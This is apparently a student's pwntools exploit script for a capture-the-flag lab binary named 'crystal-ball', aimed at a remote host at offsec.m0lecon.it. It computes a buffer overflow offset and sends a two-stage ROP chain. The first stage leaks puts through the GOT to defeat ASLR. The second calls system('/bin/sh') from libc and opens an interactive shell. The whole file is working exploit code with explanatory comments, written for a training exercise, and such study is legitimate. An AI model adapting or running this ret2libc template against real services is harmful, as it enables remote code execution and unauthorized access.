from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13519

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab6/challenges/03_crystal-ball/ret2libc_aslr')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('/home/kali/Desktop/offsec/labs/lab6/challenges/03_crystal-ball/libc.so.6', checksec=False)
#the remote server is using a different version of libc than my kali linux machine

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"wish: ")
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

rop = ROP(elf)      # no PIE so it's fixed like plt and got addr
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

pop_rdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rdi_ret' function at: {hex(pop_rdi_ret_addr)}")

PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']

#binsh_addr = next(elf.search(b'/bin/sh\x00'))    #address of "bin/sh" -> NO IN THE ELF


r = conn()

# -------- Stage 1: leak puts --------
r.recvuntil(b"wish: ")
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi_ret_addr),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(MAIN),
)

#the program will call puts which has as parameter in rdi the pointer to puts@got, so it will print puts@got that is the randomized address of the puts
# puts_addr = rand_base + offset (what is in the program)

r.sendline(stage1)
print("stage 1 payload sent\n")

r.recvline()                        # consume "The stars have spoken!"

leaked = r.recvline().strip()
print(leaked)
leak_puts = u64(leaked.ljust(8, b'\x00'))
log.info(f"puts leak = {leak_puts:#x}")

#base = leak - offset
base = leak_puts - libc.symbols['puts']
libc.address = base     #This updates the base address of libc, so if i call libc.symbols['system'] automatically equals libc_base + offset 
log.info(f"libc base = {libc.address:#x}")

# -------- Stage 2: system("/bin/sh") --------
system_addr = libc.symbols['system']

binsh_addr = next(libc.search(b'/bin/sh\x00'))

r.recvuntil(b'wish: ')
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi_ret_addr),
    p64(binsh_addr),        
    p64(system_addr),
)
r.sendline(stage2)
r.interactive()